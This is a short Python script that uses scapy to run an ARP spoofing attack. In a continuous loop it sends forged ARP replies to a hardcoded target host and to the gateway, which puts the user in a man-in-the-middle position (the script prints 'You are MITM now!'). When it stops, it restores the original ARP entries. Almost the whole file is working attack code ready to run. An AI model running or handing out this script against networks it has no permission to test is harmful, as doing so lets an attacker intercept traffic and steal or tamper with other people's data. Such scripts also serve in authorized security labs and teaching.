#!/usr/bin/env python3

import scapy.all as scapy
import time

# VARS
target_ip = "192.168.1.110"
spoof_ip = "192.168.1.1"


# ARP request sender to get MAC of target IP
def get_mac_address(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast / arp_req
    answered_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


# Spoofer
def spoof(target_ip, spoof_ip):
    target_mac = get_mac_address(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# Restorer
def restorer(dest_ip, source_ip):
    dest_mac = get_mac_address(dest_ip)
    source_mac = get_mac_address(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


# Disclaimer
print("############### Simple ARP SPOOFER by Wolchara000 ###############")
print(target_ip + " and " + spoof_ip + " were spoofed. You are MITM now!")

send_packets = 0
try:
    while True:
        spoof(target_ip, spoof_ip)
        spoof(spoof_ip, target_ip)
        send_packets = send_packets + 2
        print("\r[+] Send " + str(send_packets) + " Packets", end="")
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[+]CTRL+C is detected. Stopping Spoofer.")
    restorer(spoof_ip, target_ip)
    restorer(target_ip, spoof_ip)
    print("\nSpoofed MAC's restored")
